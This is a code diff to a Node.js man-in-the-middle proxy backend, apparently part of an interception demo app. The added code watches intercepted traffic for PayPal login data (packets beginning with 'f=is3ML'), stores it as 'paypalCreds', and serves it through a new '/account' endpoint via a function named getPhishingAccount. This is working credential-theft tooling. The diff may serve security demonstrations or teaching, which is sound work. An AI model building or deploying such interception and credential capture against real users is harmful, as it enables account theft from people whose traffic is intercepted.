@@ -5,6 +5,7 @@ var Proxy = require('http-mitm-proxy');
 var proxy = Proxy();
 
 let packetList = [];
+let paypalCreds = 'No account data collected yet.';
 let inject = undefined;
 
 const backendPort = 3001;
@@ -38,6 +39,17 @@ const properties = [
 
 prompt.start();
 
+function execPromise(cmd) {
+  return new Promise((resolve, reject) => {
+    exec(cmd, (error, stdout, stderr) => {
+      if (error) {
+        console.warn(error);
+      }
+      resolve(stdout ? stdout : stderr);
+    });
+  });
+}
+
 prompt.get(properties, function (err, result) {
   if (err) {
     console.log(err);
@@ -52,7 +64,11 @@ prompt.get(properties, function (err, result) {
     process.env['HTTPS'] ? 's' : ''
   }://platin.demo.com:3000`;
 
-  exec('npm start', () => open(APP_URL));
+  exec('npm start');
+  setTimeout(() => {
+    open(APP_URL);
+  }, 5000);
+
   console.log(`\x1b[${process.env['HTTPS'] ? '32' : '33'}m`);
   console.log(`App running on ${APP_URL}`, '\x1b[0m');
 
@@ -92,12 +108,16 @@ prompt.get(properties, function (err, result) {
     return res.send('Backend running');
   });
 
+  app.post('/', (req, res) => {
+    console.log('POST placeholder invoked');
+  });
+
   app.get('/devices', (req, res) => {
     return res.send(getDeviceList());
   });
 
-  app.get('/headers', async (req, res) => {
-    return res.send(getRecentHTTPHeaders());
+  app.get('/account', async (req, res) => {
+    return res.send(getPhishingAccount());
   });
 
   app.get('/packet', async (req, res) => {
@@ -136,6 +156,9 @@ prompt.get(properties, function (err, result) {
       let decodedASCII = rawPacketData.toString();
       console.log(decodedASCII);
       packetList.push(`packet: length ${chunk.length}, ${decodedASCII}`);
+      if (decodedASCII.startsWith('f=is3ML')) {
+        paypalCreds = decodedASCII;
+      }
       if (packetList.length > 5) {
         packetList.shift();
       }
@@ -159,6 +182,9 @@ prompt.get(properties, function (err, result) {
         packetList.push(`packet: length ${chunk.length}, ${bufferMsg}`);
       } else {
         packetList.push(`packet: length ${chunk.length}, ${decodedASCII}`);
+      }
+      if (packetList.length > 5) {
+        packetList.shift();
       }
     }
     return callback(null, chunk);
@@ -188,7 +214,9 @@ function injectMessage(msg) {
   }
 }
 
-function getRecentHTTPHeaders(params) {}
+function getPhishingAccount() {
+  return { paypalCreds };
+}
 
 function exposeCert(get) {
   let response;
@@ -205,6 +233,6 @@ module.exports = {
   getDeviceList,
   getRecentPackets,
   injectMessage,
-  getRecentHTTPHeaders,
+  getPhishingAccount,
   exposeCert,
 };
